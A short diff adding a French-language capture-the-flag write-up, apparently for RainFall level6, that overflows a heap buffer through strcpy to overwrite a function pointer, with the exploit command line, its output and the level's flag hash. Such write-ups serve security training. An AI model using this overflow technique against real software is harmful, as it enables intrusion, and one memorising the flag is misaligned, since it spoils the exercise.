@@ -1,0 +1,13 @@
+---------> On va exploiter ici <strcpy> en reecrivant la valeur du pointeur sur fonction (*f)
+---------> en lui assignant l'adresse de <n>.
+---------> Premier malloc de 64, 2eme malloc de 4
+---------> donc en ecrivant 68 caractere on reecrit apres le contenu de (*f):
+level6@RainFall:~$ ./level6 `python -c 'print "A"*68+"\x08\x04\x84\x54"[::-1]'`
+Segmentation fault (core dumped)
+
+---------> Ah! a 72 alors:
+level6@RainFall:~$ ./level6 `python -c 'print "A"*72+"\x08\x04\x84\x54"[::-1]'`
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+
+easy money.
+
